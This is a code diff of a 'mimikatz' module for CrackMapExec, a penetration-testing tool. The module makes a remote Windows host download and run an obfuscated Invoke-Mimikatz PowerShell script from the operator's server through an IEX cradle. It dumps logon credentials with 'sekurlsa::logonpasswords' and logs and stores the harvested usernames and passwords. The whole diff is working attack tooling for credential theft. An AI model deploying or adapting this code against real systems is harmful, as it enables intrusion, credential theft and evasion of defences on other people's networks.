@@ -1,4 +1,4 @@
-from cme.helpers.powershell import *
+from cme.helpers.powershell import obfs_ps_script
 from cme.helpers.misc import validate_ntlm
 from cme.helpers.logger import write_log
 from StringIO import StringIO
@@ -12,28 +12,24 @@ class CMEModule:
     '''
 
     name = 'mimikatz'
-    description = "Executes PowerSploit's Invoke-Mimikatz.ps1 script"
-    supported_protocols = ['mssql', 'smb']
+    description = "Dumps all logon credentials from memory"
+    supported_protocols = ['smb', 'mssql']
     opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module_options):
         '''
-           COMMAND Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
+           COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
         '''
-
         self.command = 'privilege::debug sekurlsa::logonpasswords exit'
-
         if module_options and 'COMMAND' in module_options:
             self.command = module_options['COMMAND']
 
-        #context.log.debug("Mimikatz command: '{}'".format(self.mimikatz_command))
+        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')
 
     def on_admin_login(self, context, connection):
-
         command = "Invoke-Mimikatz -Command '{}'".format(self.command)
         launcher = gen_ps_iex_cradle(context.server, context.localip, context.server_port, 'Invoke-Mimikatz.ps1', command)
-
         ps_command = create_ps_command(launcher)
 
         connection.execute(ps_command)
@@ -44,9 +40,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-                payload = obfs_ps_script(ps_script.read())
-                request.wfile.write(payload)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
@@ -195,15 +189,19 @@ class CMEModule:
         response.stop_tracking_host()
 
         if len(data):
-            creds = self.parse_mimikatz(data)
-            if len(creds):
-                for cred_set in creds:
-                    credtype, domain, username, password,_,_ = cred_set
-                    #Get the hostid from the DB
-                    hostid = context.db.get_computers(response.client_address[0])[0][0]
-                    context.db.add_credential(credtype, domain, username, password, hostid)
+            if self.command.find('sekurlsa::logonpasswords') != -1:
+                creds = self.parse_mimikatz(data)
+                if len(creds):
+                    for cred_set in creds:
+                        credtype, domain, username, password,_,_ = cred_set
+                        #Get the hostid from the DB
+                        hostid = context.db.get_computers(response.client_address[0])[0][0]
+                        context.db.add_credential(credtype, domain, username, password, hostid)
+                        context.log.highlight('{}\\{}:{}'.format(domain, username, password))
 
-                context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
+                    context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
+            else:
+                context.log.highlight(data)
 
             log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
             write_log(data, log_name)
